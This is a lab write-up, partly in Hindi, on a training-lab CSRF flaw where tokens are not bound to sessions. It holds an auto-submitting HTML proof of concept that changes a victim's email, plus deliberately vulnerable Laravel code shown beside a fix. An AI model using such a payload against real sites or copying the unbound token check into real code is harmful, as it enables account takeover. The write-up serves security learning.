🔐 Lab: CSRF where token is not tied to user session

 1. HOW I SOLVED THE LAB

---

🔑 Step 1: Login into Two Accounts

- Account 1: "wiener:peter"
- Account 2: "carlos:montoya"

---

🛰️ Step 2: Capture Requests

Wiener request:

POST /my-account/change-email
Cookie: session=wiener_session

email=test@gmail.com&csrf=W_TOKEN

✔️ Works normally

---

Carlos request:

POST /my-account/change-email
Cookie: session=carlos_session

email=test@gmail.com&csrf=C_TOKEN

✔️ Works normally

---

🔍 Step 3: Test CSRF Token Reuse

👉 Used Carlos ka CSRF token in Wiener request:

POST /my-account/change-email
Cookie: session=wiener_session

email=attacker@gmail.com&csrf=C_TOKEN

👉 Result:
✔️ Accepted
✔️ Email changed

---

💡 Step 4: Key Finding

👉 CSRF token user/session se bind nahi tha

---

🧨 Step 5: Create CSRF PoC

<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@gmail.com" />
      <input type="hidden" name="csrf" value="C_TOKEN" />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

---

🌍 Step 6: Exploit

1. Attacker gets valid CSRF token (from own account)
2. Embeds token in PoC
3. Victim loads page
4. Request sent with victim cookie + attacker token
5. Server accepts request

---

✅ Step 7: Lab Solved

✔️ CSRF bypass successful
✔️ Token reuse attack worked

---

🧠 2. WHY THIS WORKED

👉 Server ne sirf yeh check kiya:

- "Token valid hai ya nahi?"

👉 Lekin yeh check nahi kiya:

- "Kya yeh token iss user/session ka hai?"

👉 Result:
✔️ Any valid token works for any user ❌

---

🚨 3. ROOT CAUSE

if (token_exists_in_database(csrf_token)) {
    allow_request(); // ❌ not linked to session
}

👉 Missing check:

token.user_id == session.user_id ❌

---

❌ 4. DEVELOPER MISTAKES

---

🚫 Token not bound to session

- Same token usable across users

---

🚫 Global token validation

- Token validity ≠ user authenticity

---

🚫 No session linkage

- No mapping between token and user

---

💻 5. VULNERABLE LARAVEL CODE

---

❌ Incorrect Implementation

Route::post('/change-email', function (\Illuminate\Http\Request $request) {

    $token = $request->input('csrf');

    // ❌ Only checks if token exists
    if (\DB::table('csrf_tokens')->where('token', $token)->exists()) {

        auth()->user()->email = $request->input('email');
        auth()->user()->save();

        return "Email changed";
    }

    return "Invalid CSRF";
});

---

🚨 Problem

- Token database me hai → accept
- Kis user ka hai → check nahi ❌

---

🛡️ 6. SECURE LARAVEL CODE

---

✔️ Correct Approach (Session-bound token)

Route::post('/change-email', function (\Illuminate\Http\Request $request) {

    if ($request->input('csrf') !== session('_token')) {
        return "Invalid CSRF";
    }

    auth()->user()->email = $request->input('email');
    auth()->user()->save();

    return "Email changed";
});

---

✔️ Best Practice (Laravel Default)

<form method="POST">
    @csrf
</form>

👉 Laravel automatically:

- Generates per-session token
- Validates per-session token
- Rejects mismatch

---

⚡ 7. KEY TAKEAWAYS

- CSRF token must be unique per user session
- Token reuse across users = vulnerability
- Validation must include:
  - token match
  - session binding

---

🧠 8. INTERVIEW ONE-LINER

👉
"The application validated CSRF tokens globally but did not bind them to user sessions, allowing an attacker to reuse their own valid token to perform actions on another user's account."

---
